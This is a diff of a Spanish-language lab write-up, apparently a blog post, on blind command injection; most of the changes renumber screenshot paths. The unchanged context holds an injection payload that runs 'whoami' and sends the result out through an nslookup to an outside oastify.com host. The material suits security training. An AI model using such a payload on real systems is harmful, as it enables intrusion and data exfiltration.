@@ -29,7 +29,7 @@ En esta ocación este laboratorio no podemos redireccionar la salida del comando
 
 Copiamos el servidor `nslookup` que nos proprciona
 
-![Conf1]({{site.url}}/images/Command Injection/command-lab-4/conf1.png)
+![Conf1]({{site.url}}/images/Command Injection/command-lab-5/conf1.png)
 
 Asi que debemos inyectar el payload en la respuesta del formulario, no olvidar colocar `url enconde`
 
@@ -37,16 +37,16 @@ Asi que debemos inyectar el payload en la respuesta del formulario, no olvidar c
 & nslookup `whoami`.tjgapmpd6yhieubhjiot4zc7iyoqco0d.oastify.com #
 ```
 
-![Conf2]({{site.url}}/images/Command Injection/command-lab-4/conf2.png)
+![Conf2]({{site.url}}/images/Command Injection/command-lab-54/conf2.png)
 
 Vemos la respuesta
 
-![Conf3]({{site.url}}/images/Command Injection/command-lab-4/conf3.png)
+![Conf3]({{site.url}}/images/Command Injection/command-lab-5/conf3.png)
 
 Y la pegamos en el laboratorio
 
-![Conf4]({{site.url}}/images/Command Injection/command-lab-4/conf4.png)
+![Conf4]({{site.url}}/images/Command Injection/command-lab-5/conf4.png)
 
 ## Aprobado
 
-![Aprobado]({{site.url}}/images/Command Injection/command-lab-4/aprobado.png)
+![Aprobado]({{site.url}}/images/Command Injection/command-lab-5/aprobado.png)
